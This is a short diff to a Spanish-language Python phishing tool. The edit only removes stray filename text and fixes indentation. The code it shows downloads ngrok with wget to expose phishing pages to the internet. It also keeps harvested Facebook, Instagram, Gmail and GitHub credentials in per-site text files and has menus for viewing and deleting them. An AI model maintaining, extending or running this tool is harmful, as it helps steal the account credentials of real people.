@@ -113,7 +113,7 @@ Selecciona la plataforma:
                     os.system("rm -rf ngrok-stable-linux-arm64.tgz")
                     os.system("clear")
                     return phishing()
-        herramienta_de_phishing.py    if version == "03" or version =="3":
+            if version == "03" or version =="3":
                 if os.path.exists("ngrok"):
                     os.system("rm ngrok")
                     os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip")
@@ -186,7 +186,7 @@ Eliminar Credenciales de:
             if eliminar == "05" or eliminar == "5":
                 eliminar = "github"
             if eliminar == "06" or eliminar == "6":
-        herramienta_de_phishing.py        return phishing()
+                return phishing()
         
             os.system(f"rm -f paginas/{eliminar}/Credenciales.txt")
             print("Se ha eliminado correctamente.")
@@ -210,7 +210,7 @@ Ver credenciales de:
 ------: """)
         if ver == "01" or ver == "1":
             ver = "facebook"
-        if ver == "02" or ver == "2":herramienta_de_phishing.py
+        if ver == "02" or ver == "2":
             ver = "instagram"
         if ver == "03" or ver == "3":
             ver = "gmail"
